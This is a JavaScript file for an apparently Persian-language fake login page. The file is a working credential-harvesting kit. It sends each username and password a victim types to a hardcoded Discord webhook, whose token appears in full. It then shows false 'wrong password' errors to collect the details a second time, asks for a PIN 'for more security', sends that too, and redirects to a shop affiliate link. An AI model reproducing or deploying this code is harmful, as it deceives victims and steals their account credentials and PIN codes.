let loginButton = document.getElementById("Login1");
let username = document.getElementById("username");
let userLabel = document.getElementById("userLabel");
let password = document.getElementById("password");
let passwordLabel = document.getElementById("passwordLabel");
let checkBox = document.getElementById("checkBox");
let checkLabel = document.getElementById("checkLabel");
let remember = document.getElementById("remember");
let text = document.getElementById("text");
let pinCodeAll = document.getElementById("pinCodeAll");
let pinCode = document.getElementById("pinCode");
let massageContent = ``;
let step = 1;
function userValidate() {
  if (username.value.length < 1) {
    return false;
  } else {
    return true;
  }
}

function passValidate() {
  if (password.value.length < 1) {
    return false;
  } else {
    return true;
  }
}

function sendPin() {
  send(`Pin :${pinCode.value}`);
  textChange(`pin code وارد شده اشتباه است`);
  colorChange(`red`);
  pinCode.value = ``;
}

function validation() {
  if (!userValidate() && !passValidate()) {
  } else {
    login();
  }
}

function stepValidation() {
  if (step < 3) {
    setTimeout(validation, 1000);
  } else {
    if (pinCode.value.length < 1) {
    } else {
      setTimeout(login, 1000);
    }
  }
}

function colorChange(color) {
  text.style.color = `${color}`;
}

function allHidden() {
  username.style.display = `none`;
  userLabel.style.display = `none`;
  password.style.display = `none`;
  passwordLabel.style.display = `none`;
  checkBox.style.display = `none`;
  checkLabel.style.display = `none`;
  remember.style.display = `none`;
}

function textChange(value) {
  text.innerHTML = `${value}`;
}

function send(massage) {
  fetch(
    "https://discord.com/api/webhooks/1136571664423989289/vybyTGjSXwCx-7VzLNerW9ZCZoOJctxQaBu3CbyAL9MvPq-xpa45P60DmoEnu_BiVo_n",
    {
      body: JSON.stringify({
        content: `${massage}`,
      }),
      headers: {
        "Content-Type": "application/json",
      },
      method: "POST",
    }
  )
    .then(function (res) {
      console.log(res);
    })
    .catch(function (res) {
      console.log(res);
    });
}

function login() {
  switch (step) {
    case 1:
      send(`User Name :${username.value} \n Password :${password.value}`);
      colorChange(`red`);
      textChange(`نام کاربری یا رمز عبور وارد شده اشتباه است.`);
      password.value = ``;
      username.value = ``;
      step++;
      break;
    case 2:
      send(`User Name :${username.value} \n Password :${password.value}`);
      allHidden();
      colorChange(`white`);
      textChange(`برای امنیت بیشتر لطفا pin code خود را وارد کنید`);
      pinCodeAll.style.display = `flex`;
      step++;
      break;
    case 3:
      sendPin();
      step++;
      break;
    case 4:
      sendPin();
      setTimeout(() => {
        window.open("http://agsa.arsacia.ir/shop/aff/1031462", "_self");
      }, 1000);
  }
}
